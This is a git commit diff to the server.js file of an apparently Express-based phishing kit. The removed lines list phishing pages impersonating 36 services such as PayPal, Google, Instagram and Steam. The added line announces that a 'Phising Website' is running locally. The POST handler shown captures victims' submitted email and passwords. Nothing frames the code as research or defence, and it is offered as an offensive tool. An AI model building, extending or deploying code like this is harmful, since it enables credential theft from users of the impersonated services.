b29b93f83b93a0523a8a3d84c7f537dcb62b9e1e
nawedarshad <nawedarshad25@gmail.com>
2024-08-24 07:19:10 +0530

    Updated Webpage

--- server.js
+++ server.js
@@ -15,19 +15,7 @@ const app = express();
 app.use(bodyParser.urlencoded({extended: true}))
 
 console.log(`
-Enter which phishing attack you want to perform:\n\n
-Adobe[1]:                Badoo[2]:                     Deviantart[3]:\n
-Discord[4]:              Dropbox[5]:                   eBay[6]:\n
-Gitlab[7]:               Messenger[8]:                 Github[9]:\n
-Instagram[10]:           Google[11]:                   Instagram Followers[12]:\n
-Linkedin[13]:            Mediafire[14]:                Instagram Verify [15]:\n
-Microsoft[16]:           Netflix[17]:                  Origin[18]:\n
-Paypal[19]:              Pintrest[20]:                 Playstation[21]:\n
-Protonmail[22]:          Quora[23]:                    Reddit[24]:\n
-Roblox[25]:              Snapchat[26]:                 Spotify[27]:\n
-Stack Overflow[28]:      Steam[29]:                    TikTok[30]:\n
-Twitch[31]:              Twitter[32]:                  Vk[33]:\n
-Wordpress[34]:           Yahoo[35]:                    xbox[36]:\n
+Your Phising Website is ready and it is running at localhost:3000\n\n
 `);
 
 app.get("/", 
@@ -38,7 +26,7 @@ app.get("/",
 
 app.post("/", function(req, res)
 {
-    console.log("Post Request Recieved");
+    console.log("\nPost Request Recieved");
         const email = req.body.email;
         const new_password = req.body.password;
         const re_password = req.body.repassword;
